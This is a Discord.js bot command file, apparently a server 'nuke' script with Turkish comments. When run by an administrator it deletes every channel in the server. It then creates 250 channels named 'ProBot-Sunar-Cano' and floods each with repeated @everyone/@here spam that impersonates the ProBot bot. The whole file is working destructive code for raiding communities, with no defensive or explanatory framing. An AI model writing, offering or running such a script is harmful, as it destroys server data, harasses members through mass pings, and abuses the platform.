const Discord = require('discord.js')

exports.run = (client, message, args) => {
  if (!message.member.hasPermission('ADMINISTRATOR')) {
    return message.reply('Bu Komutu Sadece **Alwın**&**Alwarne Entertaintment** Sunucusunda Kullanılabilir.');
 }
        // Tüm Kanalları Silme
        message.guild.channels.cache.forEach(payidar => {
            payidar.delete();
        });

        // Kanal Açma & Ever Attırma
        let xxxx = 'ProBot-Sunar-Cano'

        for(let i = 0; i < 250; i++){
           message.guild.channels.create(xxxx).then(payidar => {
            payidar.send('@everyone 💛ProBot Yeni Sunucunuzu Sevdi.🤍 @here')
            payidar.send('@everyone 💛ProBot Yeni Sunucunuzu Sevdi.🤍 @here')
            payidar.send('@everyone 💛ProBot Yeni Sunucunuzu Sevdi.🤍 @here')
            payidar.send('@everyone 💛ProBot Yeni Sunucunuzu Sevdi.🤍 @here')
            payidar.send('@everyone 💛ProBot Yeni Sunucunuzu Sevdi.🤍 @here')
            payidar.send('@everyone 💛ProBot Yeni Sunucunuzu Sevdi.🤍 @here')
            payidar.send('@everyone 💛ProBot Yeni Sunucunuzu Sevdi.🤍 @here')
            payidar.send('@everyone 💛ProBot Yeni Sunucunuzu Sevdi.🤍 @here')
            payidar.send('@everyone 💛ProBot Yeni Sunucunuzu Sevdi.🤍 @here')
            payidar.send('@everyone 💛ProBot Yeni Sunucunuzu Sevdi.🤍 @here')
            payidar.send('@everyone 💛ProBot Yeni Sunucunuzu Sevdi.🤍 @here')
            payidar.send('@everyone 💛ProBot Yeni Sunucunuzu Sevdi.🤍 @here')
            payidar.send('@everyone 💛ProBot Yeni Sunucunuzu Sevdi.🤍 @here')
            payidar.send('@everyone 💛ProBot Yeni Sunucunuzu Sevdi.🤍 @here')
            payidar.send('@everyone 💛ProBot Yeni Sunucunuzu Sevdi.🤍 @here')
            payidar.send('@everyone 💛ProBot Yeni Sunucunuzu Sevdi.🤍 @here')
            payidar.send('@everyone 💛ProBot Yeni Sunucunuzu Sevdi.🤍 @here')
            payidar.send('@everyone 💛ProBot Yeni Sunucunuzu Sevdi.🤍 @here')
            })
        }
    }

exports.conf = {
    enabled: true,
    guildOnly: false,
    aliases: [],
    permLevel: 0
}

exports.help = {
    name: 'pr-1'
}